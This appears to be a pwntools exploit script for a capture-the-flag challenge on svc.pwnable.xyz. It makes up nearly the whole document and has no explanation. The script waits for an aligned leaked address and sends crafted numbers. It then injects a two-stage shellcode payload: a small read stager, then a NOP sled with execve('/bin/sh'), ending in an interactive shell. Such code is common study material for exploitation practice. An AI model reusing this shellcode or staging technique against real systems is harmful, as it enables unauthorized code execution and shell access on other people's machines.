from pwn import *
import time

context.arch = 'amd64'
#r = process('./patched')
LOCAL = False

while(1):
    if LOCAL:
        r = process('./challenge')
    else: 
        r = remote('svc.pwnable.xyz', 30028)

    
    l = r.recvline()
    num = l.decode().split("0x")[1].strip()
    num = int(num, 16)
    if (num % 0x10 != 0):
        r.close()
        continue

    assert num % 0x10 == 0
    assert (int("10000000", 16) * (num - 0x10000000) % 0x100000000) == 0
    assert (int("10000000", 16) + (num - 0x10000000))  == num

    print(str(int("10000000", 16)), str(num - 0x10000000))
    r.sendlineafter("> ", str(int("10000000", 16)) + " " + str(num - 0x10000000))
    break

sc = [
    'syscall',
    'xor rax, rax',
    'push rcx',
    'pop rsi',
    'push rax',
    'pop rdx',
    'add dl, 0x80',
    'syscall',
]


#payload = b''
payload = b'\x00\xd8'
for i,v in enumerate(sc):
    print(len(asm(v)))
    payload += asm(v)
print(payload, len(payload))

sc2 = [
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'xor rax, rax',
    'mov al, 59',
    'mov rdi, 0x68732f6e69622f',
    'push rdi',
    'mov rdi, rsp',
    'xor rsi, rsi',
    'xor rdx, rdx',
    'syscall',
    'mov al, 60',
    'syscall'
]
payload2 = b''
for i,v in enumerate(sc2):
    payload2 += asm(v)

print("payload2")
'''
f = open('./payload', 'wb')
f.write(payload + payload2)
f.close()
'''
l = r.sendafter(b"Input: ", payload)
print("l: ", l)
l = r.send(payload2)
print(l)
r.interactive()
